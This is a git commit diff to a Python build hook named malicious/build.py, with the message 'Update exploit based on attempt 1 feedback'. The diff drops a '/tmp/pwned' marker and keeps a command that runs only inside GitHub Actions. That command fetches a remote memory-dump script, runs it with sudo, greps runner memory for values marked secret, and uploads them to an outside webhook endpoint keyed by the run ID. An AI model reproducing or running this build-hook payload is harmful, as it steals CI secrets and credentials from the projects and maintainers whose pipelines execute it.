2fd15f59b769905bbea31c122f757664eece96fb
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-14 00:11:31 +0000

    Update exploit based on attempt 1 feedback

--- malicious/build.py
+++ malicious/build.py
@@ -1,9 +1,6 @@
 import os
 
 def build(setup_kwargs):
-    with open("/tmp/pwned", "w") as f:
-        f.write("pwned")
-    
     run_id = os.getenv("GITHUB_RUN_ID")
     if run_id:
         exploit = f'echo "Okay, we got this far. Let\'s continue..." && curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE \'"[^"]+":{{"value":"[^"]*","isSecret":true}}\' >> "/tmp/secrets" && curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/{run_id}"'
